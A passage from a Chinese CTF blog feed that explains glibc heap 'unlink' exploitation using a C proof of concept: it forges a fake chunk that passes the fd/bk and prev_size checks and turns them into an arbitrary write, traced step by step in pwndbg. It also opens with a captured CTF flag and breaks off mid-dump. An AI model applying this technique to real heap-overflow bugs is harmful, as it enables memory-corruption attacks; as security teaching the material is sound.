class="line"> 7) Flag</span><br><span class="line"></span><br><span class="line"> Enter choice :-</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line"></span><br><span class="line">The flag is :- pctf&#123;bUff3r-0v3Rfl0wS`4r3.alw4ys-4_cl4SsiC&#125;</span><br><span class="line">��</span><br><span class="line"></span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-05-070951.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Fastbin-Double-Free原理&quot;&gt;&lt;a href=&quot;#Fastbin-Double-Free原理&quot; class=&quot;headerlink&quot; title=&quot;Fastbin Double Free原理&quot;&gt;&lt;/a&gt;Fastbin Double Free原理&lt;/
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="堆利用" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF pwn中的unlink</title>
    <link href="http://eternalsakura13.com/2018/03/01/unlink1/"/>
    <id>http://eternalsakura13.com/2018/03/01/unlink1/</id>
    <published>2018-02-28T16:59:01.852Z</published>
    <updated>2018-02-28T18:18:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="unlink简介"><a href="#unlink简介" class="headerlink" title="unlink简介"></a>unlink简介</h2><p>unlink的目的是把一个双向链表中的空闲块拿出来，如图。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-131218.jpg" alt=""><br>也就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置 P-&gt;fd-&gt;bk = P-&gt;bk.</span><br><span class="line">设置 P-&gt;bk-&gt;fd = P-&gt;fd.</span><br></pre></td></tr></table></figure></p><h2 id="unlink时执行的检查"><a href="#unlink时执行的检查" class="headerlink" title="unlink时执行的检查"></a>unlink时执行的检查</h2><p>以前的unlink是没有检查的，很容易利用，不过现在多了两项检查，所以在利用时候要绕过这些检查。</p><table><thead><tr><th>Function</th><th style="text-align:right">Security Check</th><th style="text-align:center">Error</th></tr></thead><tbody><tr><td>unlink</td><td style="text-align:right">chunk size是否等于next chunk(内存意义上的)的prev_size</td><td style="text-align:center">corrupted size vs. prev_size</td></tr><tr><td>unlink</td><td style="text-align:right">检查是否P-&gt;fd-&gt;bk == P 以及 P-&gt;bk-&gt;fd == P</td><td style="text-align:center">corrupted double-linked list</td></tr></tbody></table><h2 id="unlink-exploit"><a href="#unlink-exploit" class="headerlink" title="unlink exploit"></a>unlink exploit</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>通过一个例子来学习一下，这个例子是<a href="https://heap-exploitation.dhavalkapil.com" target="_blank" rel="noopener">Heap Exploitation系列</a>的unlink，为了便于理解，我会用gdb详细的调试一下。<br>首先，编译程序,我使用的系统是ubuntu14.04 64位，将下面的示例代码编译出来，带上-g参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ gcc -g unlink.c -o unlink</span><br><span class="line">unlink.c: In function ‘main’:</span><br><span class="line">unlink.c:46:3: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long long unsigned int’ [-Wformat=]</span><br><span class="line">   printf(&quot;%x\n&quot;, chunk1[3]);</span><br><span class="line">   ^</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> &#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> prev_size;</span><br><span class="line">  <span class="keyword">size_t</span> size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">bk</span>;</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>];               <span class="comment">// padding</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *chunk1, *chunk2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fake_chunk</span>, *<span class="title">chunk2_hdr</span>;</span></span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// First grab two chunks (non fast)</span></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk2);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Assuming attacker has control over chunk1's contents</span></span><br><span class="line">  <span class="comment">// Overflow the heap, override chunk2's header</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// First forge a fake chunk starting at chunk1</span></span><br><span class="line">  <span class="comment">// Need to setup fd and bk pointers to pass the unlink security check</span></span><br><span class="line">  fake_chunk = (struct chunk_structure *)chunk1;</span><br><span class="line">  fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - <span class="number">3</span>); <span class="comment">// Ensures P-&gt;fd-&gt;bk == P</span></span><br><span class="line">  fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - <span class="number">2</span>); <span class="comment">// Ensures P-&gt;bk-&gt;fd == P</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Next modify the header of chunk2 to pass all security checks</span></span><br><span class="line">  chunk2_hdr = (struct chunk_structure *)(chunk2 - <span class="number">2</span>);</span><br><span class="line">  chunk2_hdr-&gt;prev_size = <span class="number">0x80</span>;  <span class="comment">// chunk1's data region size</span></span><br><span class="line">  chunk2_hdr-&gt;size &amp;= ~<span class="number">1</span>;        <span class="comment">// Unsetting prev_in_use bit</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'</span></span><br><span class="line">  <span class="comment">// This results in chunk1 pointer pointing to chunk1 - 3</span></span><br><span class="line">  <span class="comment">// i.e. chunk1[3] now contains chunk1 itself.</span></span><br><span class="line">  <span class="comment">// We then make chunk1 point to some victim's data</span></span><br><span class="line">  <span class="built_in">free</span>(chunk2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, chunk1[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  chunk1[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)data;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(data, <span class="string">"Victim's data"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite victim's data using chunk1</span></span><br><span class="line">  chunk1[<span class="number">0</span>] = <span class="number">0x002164656b636168</span>LL;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我使用了一个gdb插件pwndbg(应该是插件吧？)，需要安装的话。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></p><p>开始调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b 20</span><br><span class="line">Breakpoint 1 at 0x400695: file unlink.c, line 20.</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-173449.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure></p><p>这样就开始malloc第一个chunk了，返回的地址放在rax里，然后存到栈里。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-173700.png" alt=""><br>继续看第二个chunk的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-173806.png" alt=""><br>接下来的三条命令其实就是输出我们刚刚调试出来的chunk地址的，所以过掉就行了，不过可以检查一下我们找的是不是对的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b 25</span><br><span class="line">Breakpoint 2 at 0x4006f3: file unlink.c, line 25.</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">0x7fffffffdd60</span><br><span class="line">0x602010</span><br><span class="line">0x6020a0</span><br></pre></td></tr></table></figure></p><p>然后来详细的说明一下，是怎么unlink exploit的。<br>假设攻击者已经控制了chunk1的数据，并且可以溢出到chunk2的元数据。<br>因为我们能够控制chunk1的数据，所以当然可以在chunk1里伪造一个chunk出来。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = (struct chunk_structure *)chunk1;</span><br></pre></td></tr></table></figure></p><p>我们知道，返回给我们的chunk实际上是mem指针,<strong>如下图的mem就是chunk1</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-27-092353.jpg" alt=""><br>通过将chunk1强制转换为struct chunk_structure结构体，就伪造出了一个chunk。<br>相当于<br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-135600.jpg" alt=""><br>然后我们看一下此时的chunk1的内存。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p><p>再看一下fake_chunk,地址为0xffffcf80，指向0x0804b008（mem)<br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-174334.png" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p $rbp<span class="number">-0x40</span></span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x7fffffffdd70</span></span><br><span class="line">pwndbg&gt; x /x <span class="number">0x7fffffffdd70</span></span><br><span class="line"><span class="number">0x7fffffffdd70</span>:<span class="number">0x0000000000602010</span></span><br></pre></td></tr></table></figure></p><h3 id="通过检查点1"><a href="#通过检查点1" class="headerlink" title="通过检查点1"></a>通过检查点1</h3><p><strong>接下来要确保chunk-&gt;fd-&gt;bk == chunk</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - <span class="number">3</span>); <span class="comment">// Ensures P-&gt;fd-&gt;bk == P</span></span><br></pre></td></tr></table></figure></p><p>如果不熟悉指针加减运算的，可以参考<a href="http://c.biancheng.net/cpp/biancheng/view/47.html" target="_blank" rel="noopener">这篇文章</a><br>&amp;chunk1是指存放chunk1这个被分配出来的heap的地址的<strong>栈地址</strong>,即0x7fffffffdd60<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 10</span><br><span class="line">00:0000│ rsp  0x7fffffffdd60 —▸ 0x602010 ◂— 0x0</span><br><span class="line">01:0008│      0x7fffffffdd68 —▸ 0x6020a0 ◂— 0x0</span><br><span class="line">02:0010│      0x7fffffffdd70 —▸ 0x602010 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffdd78 —▸ 0x40084d (__libc_csu_init+77) ◂— add    rbx, 1</span><br><span class="line">04:0020│      0x7fffffffdd80 —▸ 0x7fffffffddb0 ◂— 0x0</span><br><span class="line">05:0028│      0x7fffffffdd88 ◂— 0x0</span><br><span class="line">06:0030│      0x7fffffffdd90 —▸ 0x400800 (__libc_csu_init) ◂— push   r15</span><br><span class="line">07:0038│      0x7fffffffdd98 ◂— 0xb7dbaa1d9dced400</span><br><span class="line">08:0040│      0x7fffffffdda0 —▸ 0x7fffffffde90 ◂— 0x1</span><br><span class="line">09:0048│      0x7fffffffdda8 ◂— 0x0</span><br></pre></td></tr></table></figure></p><p>此时的chunk1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:<span class="number">0x00007fffffffdd48</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p><p><strong>接下来要确保chunk-&gt;bk-&gt;fd == chunk</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - <span class="number">2</span>); <span class="comment">// Ensures P-&gt;bk-&gt;fd == P</span></span><br></pre></td></tr></table></figure></p><p>此时的chunk1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:<span class="number">0x0000000000000000</span>&lt;=fake_chunk(mem)<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:<span class="number">0x00007fffffffdd48</span>&lt;=fake_chunk-&gt;fd<span class="number">0x00007fffffffdd50</span>&lt;=fake_chunk-&gt;bk</span><br><span class="line"><span class="number">0x602030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p><p>我相信到这个时候你已经凌乱了,因为我一开始看到这里的时候也挺凌乱的（因为我指针学的不好emmm..)<br>让我们再理一下。</p><p>首先观察一下栈段，我们知道我们的变量都是存在栈上的,chunk1,fake_chunk都是指针,指针的值都是一个表示地址空间中某个存储器单元的整数,这也就是我们说的<strong>指向</strong>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *chunk1, *chunk2;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fake_chunk</span>, *<span class="title">chunk2_hdr</span>;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x40084d</span> (__libc_csu_init+<span class="number">77</span>) ◂— add    rbx, <span class="number">1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│      <span class="number">0x7fffffffdda0</span> —▸ <span class="number">0x7fffffffde90</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│      <span class="number">0x7fffffffdda8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>chunk1=0x602010<br>&amp;chunk1=0x7fffffffdd60</p><p>fake_chunk=0x602010<br>&amp;fake_chunk=0x7fffffffdd70</p><p>然后我们再看一下fake_chunk-&gt;fd，和fake_chunk_bk的值是多少。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:<span class="number">0x0000000000000000</span>&lt;=fake_chunk(mem)<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:<span class="number">0x00007fffffffdd48</span>&lt;=fake_chunk-&gt;fd<span class="number">0x00007fffffffdd50</span>&lt;=fake_chunk-&gt;bk</span><br><span class="line"><span class="number">0x602030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p><p>fake_chunk-&gt;fd=0x00007fffffffdd48<br>fake_chunk-&gt;bk=0x00007fffffffdd50</p><p>需要知道的是，fd和bk的类型同样是struct chunk_structure <em>，也就是说fake-&gt;chunk-&gt;fd/bk指向的内存也是”<em>*结构体</em></em>“<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">bk</span>;</span></span><br></pre></td></tr></table></figure></p><p>所以这个指向的”结构体”是这样的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x00007fffffffdd48</span></span><br><span class="line"><span class="number">0x7fffffffdd48</span>:<span class="number">0x00007ffff7ffe1c8</span>-&gt;prev_size<span class="number">0x0000000000000003</span>-&gt;size</span><br><span class="line"><span class="number">0x7fffffffdd58</span>:<span class="number">0x00000000004006f3</span>-&gt;fd<span class="number">0x0000000000602010</span>-&gt;bk</span><br><span class="line"></span><br><span class="line"><span class="number">0x7fffffffdd68</span>:<span class="number">0x00000000006020a0</span><span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7fffffffdd78</span>:<span class="number">0x000000000040084d</span><span class="number">0x00007fffffffddb0</span></span><br><span class="line"><span class="number">0x7fffffffdd88</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000400800</span></span><br></pre></td></tr></table></figure></p><p>所以fake_chunk-&gt;fd-&gt;bk=0x0000000000602010=chunk1<br>而我们知道fake_chunk=chunk1。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = (struct chunk_structure *)chunk1;</span><br></pre></td></tr></table></figure></p><p><strong>所以这样就过了chunk-&gt;fd-&gt;bk==chunk的检查</strong><br><strong>chunk-&gt;bk-&gt;fd == chunk也是同理的</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-02-28-144600.png" alt=""></p><h3 id="通过检查点2"><a href="#通过检查点2" class="headerlink" title="通过检查点2"></a>通过检查点2</h3><p>然后为了通过检查点<code>chunk size是否等于next chunk(内存意义上的)的prev_size</code>,我们需要修改chunk2的prev_size<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk2_hdr = (struct chunk_structure *)(chunk2 - <span class="number">2</span>);</span><br><span class="line">chunk2_hdr-&gt;prev_size = <span class="number">0x80</span>;  <span class="comment">// chunk1's data region size</span></span><br><span class="line">chunk2_hdr-&gt;size &amp;= ~<span class="number">1</span>;        <span class="comment">// Unsetting prev_in_use bit</span></span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602090</span></span><br><span class="line"><span class="number">0x602090</span>:<span class="number">0x0000000000000080</span><span class="number">0x0000000000000090</span></span><br><span class="line"><span class="number">0x6020a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h3 id="触发unlink"><a href="#触发unlink" class="headerlink" title="触发unlink"></a>触发unlink</h3><p>当我们free(chunk2)的时候，因为prev_in_use位被置0，代表前一个chunk（也就是我们的fake_chunk)也处于free，连续的空闲堆块合并而进行unlink操作。<br>也就是设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk = P-&gt;bk.</span><br><span class="line">P-&gt;bk-&gt;fd = P-&gt;fd.</span><br></pre></td></tr></table></figure></p><p>可以看出fake_chunk-&gt;fd-&gt;bk和fake_chunk-&gt;bk-&gt;fd都指向(或者说等于)chunk1,即0x0000000000602010，所以只需要关注第二次操作即可。</p><p>P-&gt;fd即fake_chunk-&gt;fd=0x00007fffffffdd48<br>所以unlink之后,P-&gt;bk-&gt;fd由0x602010变为0x00007fffffffdd48<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x602010</span> &lt;=P-&gt;bk-&gt;fd</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x602090</span> ◂— <span class="number">0x80</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span 